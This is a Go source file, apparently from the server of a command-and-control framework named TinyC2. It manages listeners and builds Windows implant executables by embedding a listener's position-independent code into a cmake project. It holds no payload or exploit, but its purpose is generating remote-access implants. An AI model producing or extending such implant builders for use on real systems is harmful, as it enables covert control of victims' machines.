package core

import (
	"fmt"
	"hash/crc32"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/0xPrimo/TinyC2/sdk"

	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"

	"github.com/pterm/pterm"
)

type Listener struct {
	ID        uint32
	Name      string
	Interface sdk.IListener
	Config    string

	sdk.IAdapterListener
}

func (e *Engine) ListenerStart(plugin string, name string, config string) error {
	if e.Listeners.Has(name) {
		return fmt.Errorf("listener %s already exists", name)
	}

	pl, ok := e.PluginListener(plugin)
	if !ok {
		return fmt.Errorf("unknown plugin %s", plugin)
	}

	listener := &Listener{
		ID:               crc32.ChecksumIEEE([]byte(name)),
		Name:             name,
		Config:           config,
		IAdapterListener: pl.NewAdapter(),
	}

	err := listener.Start(name, config)
	if err != nil {
		return err
	}

	e.Listeners.Set(name, listener)

	return nil
}

func (e *Engine) ListenerStop(name string) error {
	listener, ok := e.Listeners.Get(name)
	if !ok {
		return fmt.Errorf("listener %s doesn't exists", name)
	}

	if err := listener.Stop(); err != nil {
		return err
	}

	e.Listeners.Delete(name)

	return nil
}

func (e *Engine) ListenerList() error {
	table := pterm.TableData{
		{"ID", "Name", "Config"},
	}

	e.Listeners.ForEach(func(name string, listener *Listener) {
		table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", listener.ID)), listener.Name, listener.Config})
	})

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ListenerGenerate(name string, dest string) error {

	listener, ok := e.Listeners.Get(name)
	if !ok {
		return fmt.Errorf("listener %s doesn't exists", name)
	}

	pic, args, err := listener.Extension(0)
	if err != nil {
		return err
	}

	// err = os.WriteFile("../debug.pic", pic, 0644)
	// if err != nil {
	// 	return err
	// }

	// build cmake project
	//
	src, _ := filepath.Abs("../implant")
	binary, err := buildCmakeProject(src, pic, args)
	if err != nil {
		return err
	}

	// write binary
	//
	err = os.WriteFile(dest, binary, 0o644)
	if err != nil {
		return err
	}

	return nil
}

func buildCmakeProject(src string, pic []byte, picargs []byte) ([]byte, error) {
	os.MkdirAll(src+"/build", 0o755)

	// build project
	//
	args := []string{
		"-S", src,
		"-B", src + "/build",
		"-DDEFAULT_CHANNEL=" + toCArray(pic),
		"-DDEFAULT_CHANNEL_CONFIG=" + toCArray(picargs),
	}
	cmd := exec.Command("cmake", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil, err
	}

	args = []string{"--build", src + "/build"}
	cmd = exec.Command("cmake", args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		logger.Error("configuration failed: %v", err)
		return nil, err
	}

	// read binary
	//
	data, err := os.ReadFile(src + "/build/Implant.exe")
	if err != nil {
		return nil, fmt.Errorf("failed to read implant exe: %w", err)
	}

	return data, nil
}

func toCArray(data []byte) string {
	bytes := make([]string, len(data)+1)

	for i, b := range data {
		bytes[i] = fmt.Sprintf("0x%02x", b)
	}

	return "{" + strings.Join(bytes, ", ") + "}"
}
